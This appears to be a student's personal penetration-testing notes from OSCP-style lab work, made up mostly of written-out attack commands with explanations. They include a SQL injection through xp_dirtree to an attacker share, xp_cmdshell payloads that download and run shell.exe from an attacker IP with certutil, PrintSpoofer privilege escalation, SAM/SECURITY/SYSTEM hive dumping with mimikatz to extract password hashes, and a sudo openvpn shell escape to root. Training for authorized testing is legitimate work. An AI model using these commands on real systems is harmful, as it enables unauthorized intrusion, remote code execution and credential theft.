  

```SQL
';exec master..xp_dirtree '\\192.168.45.205\test';-- s

This code is an example of SQL injection, a type of attack that allows an attacker to execute arbitrary SQL code on a database. Here's a breakdown:

1. `';` - This closes any existing SQL statement.
2. `exec master..xp_dirtree '\\192.168.45.205\test';` - 
This executes the `xp_dirtree` stored procedure, which lists the directory 
structure of the specified path. In this case, it attempts to access a network 
share at `\\192.168.45.205\test`.
3. `--` - This is a comment delimiter in SQL, which comments out the rest of the 
line, preventing any syntax errors from the original query.
4. `s` - This is part of the comment and has no effect.

This type of injection can be used to exploit vulnerabilities in applications 
that do not properly sanitize user inputs.
exec: This keyword is used to execute a command or stored procedure in SQL Server.
master: This is the name of the system database in SQL Server where many system 
stored procedures and functions are stored.
: This syntax is used to specify that the stored procedure is in the master 
database. The double dot .. is shorthand for the current database context.
xp_dirtree: This is an extended stored procedure that lists the directory 
structure of a specified path.
.. This indicates that the stored procedure should be executed from the master 
database, using the default schema.
```

```SQL
'; EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.205/shell.exe C:\temp\shell.exe';--
```

```SQL
'; EXEC xp_cmdshell 'C:\temp\shell.exe';--
```

or as one

```SQL
'; EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.218/shell.exe C:\temp\shell.exe  C:\temp\shell.exe';--
```

The `SeImpersonatePrivilege` is the privilege that can be exploited using PrintSpoofer for privilege escalation.

### Relevant Privilege:

- **SeImpersonatePrivilege**
    - **Description**: Impersonate a client after authentication.
    - **State**: Enabled.

### Why SeImpersonatePrivilege is Exploitable:

- **Impersonation Tokens**: This privilege allows a process to impersonate another user's security context, which can be exploited to gain higher privileges.
- **Token Duplication**: Tools like PrintSpoofer can duplicate tokens from privileged services and use them to escalate privileges.

### Summary:

Among the listed privileges, `SeImpersonatePrivilege` is the one that can be used by PrintSpoofer to perform privilege escalation.

```SQL
printspoofer.exe  -i -c powershell
```

```SQL
reg save hklm\sam sam.hiv
reg save hklm\security security.hiv
reg save hklm\system system.hiv
./mimikatz64.exe "privilege::debug" "token::elevate" "lsadump::sam sam.hiv security.hiv system.hiv" "exit"
./mimikatz64.exe "lsadump::sam /system:C:\TEMP\SYSTEM /sam:C:\TEMP\SAM" "exit"
./mimikatz64.exe "lsadump::sam sam.hiv security.hiv system.hiv" "exit"
```

1. `**"privilege::debug"**`:
    - This command enables the `**SeDebugPrivilege**`, which allows Mimikatz to access sensitive parts of the system. This privilege is necessary for many of Mimikatz’s operations.
2. `**"token::elevate"**`:
    - This command attempts to elevate the current process token to gain higher privileges. This is useful for ensuring that Mimikatz has the necessary permissions to perform its tasks.
3. `**"lsadump::sam /sam:C:\TEMP\sam.hiv /security:C:\TEMP\security.hiv /system:C:\TEMP\system.hiv"**`:

- `**lsadump::sam**`: This module of Mimikatz is used to dump the Security Account Manager (SAM) database, which contains user account information and hashed passwords.
- `**/sam:C:\TEMP\sam.hiv**`: Specifies the path to the saved SAM hive file.
- `**/security:C:\TEMP\security.hiv**`: Specifies the path to the saved SECURITY hive file.
- `**/system:C:\TEMP\system.hiv**`: Specifies the path to the saved SYSTEM hive file.
- **LSA** stands for **Local Security Authority**

  

```SQL
 sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
```

The command `**sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'**` shifts to using root privileges because of the `**sudo**` command at the beginning. Here’s why:

### Understanding `**sudo**`

- `**sudo**`: This command stands for “superuser do” and is used to run commands with elevated (root) privileges. When you prefix a command with `**sudo**`, it executes that command as the root user, which has unrestricted access to the system.

### Why Use `**sudo**` with OpenVPN?

- **Network Configuration**: OpenVPN often requires root privileges to configure network interfaces, routing tables, and other system-level settings. Running OpenVPN without `**sudo**` might result in permission errors, preventing it from functioning correctly.

### Specific Command Breakdown

`sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'`

- `**sudo**`: Executes the entire command with root privileges.
- `**openvpn**`: Starts the OpenVPN client.
- `**-dev null**`: Uses a null device, typically for testing purposes.
- `**-script-security 2**`: Allows user-defined scripts to be executed.
- `**-up '/bin/sh -c sh'**`: Runs a shell command when the VPN connection is established.

### Security Implications

Running commands with `**sudo**` can pose security risks if not handled carefully:

- **Elevated Privileges**: The command and any scripts it runs have full access to the system, which can be dangerous if the scripts contain vulnerabilities or malicious code.
- **Script Execution**: The `**-up**` option executes a shell command, which can be exploited if the command or script is not secure.

### Best Practices

- **Minimize Use of** `**sudo**`: Only use `**sudo**` when absolutely necessary.
- **Review Scripts**: Ensure any scripts or commands executed with elevated privileges are secure and trusted.
- **Use Least Privilege**: Follow the principle of least privilege to minimize potential security risks.

  

  

for 11

  

use this command check if return true, it is admin user

```SQL
$user = [Security.Principal.WindowsIdentity]::GetCurrent();(New-Object Security.Principal.WindowsPrincipal($user)).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
</code></pre>
```

```SQL
icacls C:\DevelopmentExecutables\auditTracker.exe
icacls stands for Integrity Control Access Control Lists. It’s a command-line 
utility in Windows used to manage file and directory permissions. With icacls, 
you can view, modify, backup, and restore the access control lists (ACLs) that

 define the permissions for users and groups.
```

  

[[Notion/Offsec/oscpMedth/oscpSE|oscpSE]]